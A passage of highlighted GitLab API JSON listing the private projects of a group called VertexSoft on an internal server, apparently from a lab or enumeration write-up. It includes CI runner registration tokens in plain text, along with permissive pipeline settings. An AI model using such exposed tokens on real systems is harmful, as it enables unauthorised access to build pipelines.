    <span class="token property">"import_type"</span><span class="token operator">:</span> <span class="token string">"gitlab_project"</span><span class="token punctuation">,</span>        <span class="token property">"import_status"</span><span class="token operator">:</span> <span class="token string">"finished"</span><span class="token punctuation">,</span>        <span class="token property">"open_issues_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"description_html"</span><span class="token operator">:</span> <span class="token string">"&lt;p data-sourcepos=\"1:1-1:40\" dir=\"auto\">VertexSoft Internal Employee Service App&lt;/p>"</span><span class="token punctuation">,</span>        <span class="token property">"updated_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:01:00.622Z"</span><span class="token punctuation">,</span>        <span class="token property">"ci_default_git_depth"</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>        <span class="token property">"ci_forward_deployment_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_forward_deployment_rollback_allowed"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_job_token_scope_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"ci_separated_caches"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_allow_fork_pipelines_to_run_in_parent_project"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"build_git_strategy"</span><span class="token operator">:</span> <span class="token string">"fetch"</span><span class="token punctuation">,</span>        <span class="token property">"keep_latest_artifact"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"restrict_user_defined_variables"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"runners_token"</span><span class="token operator">:</span> <span class="token string">"GR1348941nmFUY2NxrQoLyDNnGYPx"</span><span class="token punctuation">,</span>        <span class="token property">"runner_token_expiration_interval"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"group_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auto_cancel_pending_pipelines"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"build_timeout"</span><span class="token operator">:</span> <span class="token number">3600</span><span class="token punctuation">,</span>        <span class="token property">"auto_devops_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auto_devops_deploy_strategy"</span><span class="token operator">:</span> <span class="token string">"continuous"</span><span class="token punctuation">,</span>        <span class="token property">"ci_config_path"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"public_jobs"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"shared_with_groups"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"only_allow_merge_if_pipeline_succeeds"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"allow_merge_on_skipped_pipeline"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"request_access_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"only_allow_merge_if_all_discussions_are_resolved"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"remove_source_branch_after_merge"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"printing_merge_request_link_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"merge_method"</span><span class="token operator">:</span> <span class="token string">"merge"</span><span class="token punctuation">,</span>        <span class="token property">"squash_option"</span><span class="token operator">:</span> <span class="token string">"default_off"</span><span class="token punctuation">,</span>        <span class="token property">"enforce_auth_checks_on_uploads"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"suggestion_commit_message"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"merge_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"squash_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"issue_branch_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"warn_about_potentially_unwanted_characters"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"autoclose_referenced_issues"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"permissions"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"project_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">40</span><span class="token punctuation">,</span>                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token null keyword">null</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"group_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">50</span><span class="token punctuation">,</span>                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token number">3</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"VertexSoft's old ERP system"</span><span class="token punctuation">,</span>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"ERP_Old"</span><span class="token punctuation">,</span>        <span class="token property">"name_with_namespace"</span><span class="token operator">:</span> <span class="token string">"VertexSoft / ERP_Old"</span><span class="token punctuation">,</span>        <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"erp_old"</span><span class="token punctuation">,</span>        <span class="token property">"path_with_namespace"</span><span class="token operator">:</span> <span class="token string">"vertexsoft/erp_old"</span><span class="token punctuation">,</span>        <span class="token property">"created_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:00:05.051Z"</span><span class="token punctuation">,</span>        <span class="token property">"default_branch"</span><span class="token operator">:</span> <span class="token string">"master"</span><span class="token punctuation">,</span>        <span class="token property">"tag_list"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"topics"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"ssh_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"git@192.168.8.42:vertexsoft/erp_old.git"</span><span class="token punctuation">,</span>        <span class="token property">"http_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/erp_old.git"</span><span class="token punctuation">,</span>        <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/erp_old"</span><span class="token punctuation">,</span>        <span class="token property">"readme_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/erp_old/-/blob/master/README.md"</span><span class="token punctuation">,</span>        <span class="token property">"forks_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"star_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"last_activity_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:00:05.004Z"</span><span class="token punctuation">,</span>        <span class="token property">"namespace"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexSoft"</span><span class="token punctuation">,</span>            <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>            <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"group"</span><span class="token punctuation">,</span>            <span class="token property">"full_path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>            <span class="token property">"parent_id"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/groups/vertexsoft"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"repository_storage"</span><span class="token operator">:</span> <span class="token string">"default"</span><span class="token punctuation">,</span>        <span class="token property">"_links"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"self"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2"</span><span class="token punctuation">,</span>            <span class="token property">"issues"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/issues"</span><span class="token punctuation">,</span>            <span class="token property">"merge_requests"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/merge_requests"</span><span class="token punctuation">,</span>            <span class="token property">"repo_branches"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/repository/branches"</span><span class="token punctuation">,</span>            <span class="token property">"labels"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/labels"</span><span class="token punctuation">,</span>            <span class="token property">"events"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/events"</span><span class="token punctuation">,</span>            <span class="token property">"members"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/members"</span><span class="token punctuation">,</span>            <span class="token property">"cluster_agents"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/2/cluster_agents"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"packages_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"empty_repo"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"archived"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"visibility"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"resolve_outdated_diff_discussions"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"container_expiration_policy"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"cadence"</span><span class="token operator">:</span> <span class="token string">"1d"</span><span class="token punctuation">,</span>            <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"keep_n"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>            <span class="token property">"older_than"</span><span class="token operator">:</span> <span class="token string">"90d"</span><span class="token punctuation">,</span>            <span class="token property">"name_regex"</span><span class="token operator">:</span> <span class="token string">".*"</span><span class="token punctuation">,</span>            <span class="token property">"name_regex_keep"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"next_run_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-12T17:00:07.041Z"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"repository_object_format"</span><span class="token operator">:</span> <span class="token string">"sha1"</span><span class="token punctuation">,</span>        <span class="token property">"issues_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"merge_requests_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"wiki_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"jobs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"snippets_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"container_registry_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"service_desk_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"service_desk_address"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"can_create_merge_request_in"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"issues_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"repository_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"merge_requests_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"forking_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"wiki_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"builds_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"snippets_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"pages_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"analytics_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"container_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"security_and_compliance_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"releases_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"environments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"feature_flags_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"infrastructure_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"monitor_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"model_experiments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"model_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"emails_disabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"emails_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"shared_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"lfs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"creator_id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token property">"import_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"import_type"</span><span class="token operator">:</span> <span class="token string">"gitlab_project"</span><span class="token punctuation">,</span>        <span class="token property">"import_status"</span><span class="token operator">:</span> <span class="token string">"finished"</span><span class="token punctuation">,</span>        <span class="token property">"open_issues_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"description_html"</span><span class="token operator">:</span> <span class="token string">"&lt;p data-sourcepos=\"1:1-1:27\" dir=\"auto\">VertexSoft's old ERP system&lt;/p>"</span><span class="token punctuation">,</span>        <span class="token property">"updated_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:00:07.428Z"</span><span class="token punctuation">,</span>        <span class="token property">"ci_default_git_depth"</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>        <span class="token property">"ci_forward_deployment_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_forward_deployment_rollback_allowed"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_job_token_scope_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"ci_separated_caches"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_allow_fork_pipelines_to_run_in_parent_project"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"build_git_strategy"</span><span class="token operator">:</span> <span class="token string">"fetch"</span><span class="token punctuation">,</span>        <span class="token property">"keep_latest_artifact"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"restrict_user_defined_variables"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"runners_token"</span><span class="token operator">:</span> <span class="token string">"GR1348941iNU3bBzdNg5pzdrmapMJ"</span><span class="token punctuation">,</span>        <span class="token property">"runner_token_expiration_interval"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"group_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auto_cancel_pending_pipelines"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"build_timeout"</span><span class="token operator">:</span> <span class="token number">3600</span><span class="token punctuation">,</span>        <span class="token property">"auto_devops_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auto_devops_deploy_strategy"</span><span class="token operator">:</span> <span class="token string">"continuous"</span><span class="token punctuation">,</span>        <span class="token property">"ci_config_path"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"public_jobs"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"shared_with_groups"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"only_allow_merge_if_pipeline_succeeds"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"allow_merge_on_skipped_pipeline"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"request_access_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"only_allow_merge_if_all_discussions_are_resolved"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"remove_source_branch_after_merge"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"printing_merge_request_link_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"merge_method"</span><span class="token operator">:</span> <span class="token string">"merge"</span><span class="token punctuation">,</span>        <span class="token property">"squash_option"</span><span class="token operator">:</span> <span class="token string">"default_off"</span><span class="token punctuation">,</span>        <span class="token property">"enforce_auth_checks_on_uploads"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"suggestion_commit_message"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"merge_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"squash_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"issue_branch_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"warn_about_potentially_unwanted_characters"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"autoclose_referenced_issues"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"permissions"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"project_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">40</span><span class="token punctuation">,</span>                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token null keyword">null</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"group_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">50</span><span class="token punctuation">,</span>                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token number">3</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"PortalCode"</span><span class="token punctuation">,</span>        <span class="token property">"name_with_namespace"</span><span class="token operator">:</span> <span class="token string">"VertexSoft / PortalCode"</span><span class="token punctuation">,</span>        <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"portalcode"</span><span class="token punctuation">,</span>        <span class="token property">"path_with_namespace"</span><span class="token operator">:</span> <span class="token string">"vertexsoft/portalcode"</span><span class="token punctuation">,</span>        <span class="token property">"created_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T15:53:27.257Z"</span><span class="token punctuation">,</span>        <span class="token property">"default_branch"</span><span class="token operator">:</span> <span class="token string">"main"</span><span class="token punctuation">,</span>        <span class="token property">"tag_list"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"topics"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"ssh_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"git@192.168.8.42:vertexsoft/portalcode.git"</span><span class="token punctuation">,</span>        <span class="token property">"http_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/portalcode.git"</span><span class="token punctuation">,</span>        <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/portalcode"</span><span class="token punctuation">,</span>        <span class="token property">"readme_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/portalcode/-/blob/main/README.md"</span><span class="token punctuation">,</span>        <span class="token property">"forks_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"star_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"last_activity_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-15T14:30:40.441Z"</span><span class="token punctuation">,</span>        <span class="token property">"namespace"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexSoft"</span><span class="token punctuation">,</span>            <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>            <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"group"</span><span class="token punctuation">,</span>            <span class="token property">"full_path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>            <span class="token property">"parent_id"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/groups/vertexsoft"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"repository_storage"</span><span class="token operator">:</span> <span class="token string">"default"</span><span class="token punctuation">,</span>        <span class="token property">"_links"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"self"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1"</span><span class="token punctuation">,</span>            <span class="token property">"issues"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/issues"</span><span class="token punctuation">,</span>            <span class="token property">"merge_requests"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/merge_requests"</span><span class="token punctuation">,</span>            <span class="token property">"repo_branches"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/repository/branches"</span><span class="token punctuation">,</span>            <span class="token property">"labels"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/labels"</span><span class="token punctuation">,</span>            <span class="token property">"events"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/events"</span><span class="token punctuation">,</span>            <span class="token property">"members"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/members"</span><span class="token punctuation">,</span>            <span class="token property">"cluster_agents"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/cluster_agents"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"packages_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"empty_repo"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"archived"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"visibility"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"resolve_outdated_diff_discussions"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"container_expiration_policy"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"cadence"</span><span class="token operator">:</span> <span class="token string">"1d"</span><span class="token punctuation">,</span>            <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"keep_n"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>            <span class="token property">"older_than"</span><span class="token operator">:</span> <span class="token string">"90d"</span><span class="token punctuation">,</span>            <span class="token property">"name_regex"</span><span class="token operator">:</span> <span class="token string">".*"</span><span class="token punctuation">,</span>            <span class="token property">"name_regex_keep"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"next_run_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-12T15:53:27.309Z"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"repository_object_format"</span><span class="token operator">:</span> <span class="token string">"sha1"</span><span class="token punctuation">,</span>        <span class="token property">"issues_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"merge_requests_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"wiki_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"jobs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"snippets_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"container_registry_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"service_desk_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"service_desk_address"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"can_create_merge_request_in"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"issues_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"repository_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"merge_requests_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"forking_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"wiki_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"builds_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"snippets_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token 